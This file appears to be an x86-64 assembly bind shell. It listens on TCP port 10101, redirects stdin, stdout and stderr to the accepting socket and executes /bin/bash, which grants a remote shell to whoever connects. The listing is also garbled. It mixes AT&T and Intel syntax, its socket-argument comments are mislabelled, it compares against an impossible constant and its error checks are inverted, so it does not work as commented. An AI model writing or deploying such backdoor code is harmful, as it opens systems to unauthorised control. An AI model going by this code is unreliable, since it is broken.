# Define structure sizes (adjust if needed)
.equ sin_size, 16
.equ sock_size, 4
.equ fd_size, 4

# Allocate memory for variables
.comm sin, sin_size, rw  ; Allocate and initialize sin structure with read-write access
.comm sock, sock_size, rw  ; Allocate and initialize sock variable with read-write access
.comm fd, fd_size, rw      ; Allocate and initialize fd variable with read-write access

.LC0: .string "/bin/bash"

bash:
    .quad   .LC0  ; Pointer to "/bin/bash" string

main:
    pushq   %rbp  ; Save base pointer

    movq    %rsp, %rbp  ; Set base pointer

    ; Initialize sin structure (check offset for sin_family on your system)
    movb    $AF_INET, BYTE PTR sin[0]  ; Store sin_family in the first byte of sin
    movl    $10101, %edi              ; Set port number
    call    htons  ; Convert port number to network byte order
    movw    %ax, WORD PTR sin[2]      ; Store converted port number in sin_port

    ; Create socket
    movl    $6, %edx       ; AF_INET
    movl    $1, %esi       ; SOCK_STREAM
    movl    $2, %edi       ; IPPROTO_TCP
    call    socket
    movl    %eax, DWORD PTR sock[rip]  ; Store socket file descriptor

    ; Bind socket to address
    movl    sin_size, %edx  ; Size of sockaddr_in structure
    lea     sin(%rip), %esi  ; Address of sin structure
    movl    DWORD PTR sock[rip], %edi  ; Socket file descriptor
    call    bind  ; Bind socket to address

    ; Listen for connections
    movl    DWORD PTR sock[rip], %eax  ; Socket file descriptor
    movl    $1, %esi       ; Backlog (number of pending connections)
    movl    DWORD PTR sock[rip], %edi  ; Socket file descriptor
    call    listen  ; Listen for incoming connections

    ; Accept a connection
    movl    DWORD PTR sock[rip], %eax  ; Socket file descriptor
    movl    $0, %edx       ; Client address (unused here)
    movl    $0, %esi       ; Client address length (unused here)
    movl    DWORD PTR sock[rip], %edi  ; Socket file descriptor
    call    accept  ; Accept an incoming connection
    movl    %eax, DWORD PTR fd[rip]  ; Store client socket file descriptor

    ; Duplicate file descriptors (check error handling for each call)
    movl    DWORD PTR fd[rip], %eax  ; Client socket file descriptor
    movl    $0, %esi       ; Standard input (stdin) descriptor
    movl    DWORD PTR fd[rip], %edi  ; Client socket file descriptor
    call    dup2
    cmpl    $0xfffffffffffffffff, %eax  ; Check for error (dup2 returns -1 on failure)
    jne    error       ; Jump to error handling if dup2 fails

    movl    DWORD PTR fd[rip], %eax  ; Client socket file descriptor
    movl    $1, %esi       ; Standard output (stdout) descriptor
    movl    DWORD PTR fd[rip], %edi  ; Client socket file descriptor
    call    dup2
    cmpl    $0xfffffffffffffffff, %eax  ; Check for error (dup2 returns -1 on failure)
    jne    error       ; Jump to error handling if dup2 fails

    movl    DWORD PTR fd[rip], %eax  ; Client socket file descriptor
    movl    $2, %esi       ; Standard error (stderr) descriptor
    movl    DWORD PTR fd[rip], %edi  ; Client socket file descriptor
    call    dup2
    cmpl    $0xfffffffffffffffff, %eax  ; Check for error (dup2 returns -1 on failure)
    jne    error       ; Jump to error handling if dup2 fails

    ; Execute bash shell
    movq    bash(%rip), %rcx  ; Argument array pointer (currently empty)
    movq    bash(%rip), %rax  ; Program path
    mov     rdx, NULL                 ; envp (environment variables) - NULL for default environment
    mov     rsi, %rcx                 ; Argument array pointer
    mov     rdi, %rax                 ; Program path
    mov     eax, 0                   ; Arguments for execlp
    call    execlp                   ; Replace current process with `/bin/bash`

error:  ; Add error handling code here (e.g., print error message, exit)
    mov     eax, 1                   ; Set exit code (modify as needed)
    popq    %rbp                      ; Restore base pointer
    ret                             ; Return from main


